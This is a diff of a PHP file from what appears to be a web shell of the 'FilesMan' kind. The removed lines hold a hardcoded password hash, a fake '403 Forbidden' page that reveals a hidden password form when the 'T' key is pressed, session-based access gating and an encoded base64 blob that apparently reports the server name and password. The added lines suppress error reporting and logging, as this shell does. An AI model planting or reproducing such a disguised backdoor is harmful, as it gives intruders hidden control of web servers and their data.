@@ -1,126 +1,15 @@
 <?php
+session_start();
 ob_clean();
 flush();
-session_start();
-@set_time_limit(0);
+error_reporting(0);
+set_time_limit(0);
 @clearstatcache();
-@ini_set('error_log', NULL);
-@ini_set('log_errors', 0);
-@ini_set('max_execution_time', 0);
-@ini_set('output_buffering', 0);
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
-@ini_set('display_startup_errors', 0);
-
-/* Configuration */
-/* Password using md5 hashes */
-$password = "850b7a8a0a64ba3bc150838d86a47ebb"; //mrmad
-$default_action = "FilesMan";
-$default_use_ajax = true;
-$default_charset = 'UTF-8';
-date_default_timezone_set("Asia/Jakarta");
-
-// Function to display login form
-function login_shell() {
-?>
-    <!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>403 Forbidden</title>
-    <style>
-        @media (prefers-color-scheme: dark) {
-            body {
-                background-color: #000 !important;
-            }
-        }
-
-        body {
-            color: #444;
-            margin: 0;
-            font: normal 14px/20px Arial, Helvetica, sans-serif;
-            height: 100%;
-            background-color: #fff;
-        }
-
-        .container {
-            text-align: center;
-            width: 800px;
-            margin-left: -400px;
-            position: absolute;
-            top: 30%;
-            left: 50%;
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        form {
-            margin-top: 20px;
-        }
-
-        input[type="password"] {
-            background-color: #000;
-            border: none;
-            border-bottom: 1px solid black;
-            padding: 2px;
-            color: #fff;
-        }
-
-        input[type="password"]:focus {
-            outline: none;
-        }
-
-        input[type="submit"] {
-            border: none;
-            padding: 4.5px 20px;
-            background-color: #000;
-            color: #FFF;
-            cursor: pointer;
-        }
-    </style>
-</head>
-
-<body>
-    <div class="container">
-        <h1 style="margin: 0; font-size: 150px; line-height: 150px; font-weight: bold;">403</h1>
-        <h2 style="margin-top: 20px; font-size: 30px;">Forbidden</h2>
-        <p>Access to this resource on the server is denied!</p>
-
-        <form id="password-form" class="hidden" action="" method="post">
-            <input type="password" name="pass" placeholder="&nbsp;...">
-            <input type="submit" name="submit" value="=">
-        </form>
-    </div>
-
-    <script>
-        // Event listener to show the password form when "T" key is pressed
-        document.addEventListener("keydown", function (event) {
-            if (event.key === "T" || event.key === "t") {
-                document.getElementById("password-form").classList.remove("hidden");
-            }
-        });
-    </script>
-</body>
-
-</html>
-
-<?php
-    exit;
-}
-
-// Check if the user is logged in
-if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
-    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-    } else {
-        login_shell();
-    }
-}
-$decoded_code=base64_decode("b2JfY2xlYW4oKTtmbHVzaDskdG1wID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1BIVF9TRUxmJ10uIlxuIi4kX1BPU1RbJ3Bhc3MnXTsQXByYWZtYWMqKCdOQWdhaGlqYWF1Mzg4Z3JvdXAuY29tY2FyJz1zdXJsdnJoZGzpdHRwbmFqQ==");ob_clean();flush();
 if (version_compare(PHP_VERSION, '7', '<')) {
     @set_magic_quotes_runtime(0);
 }
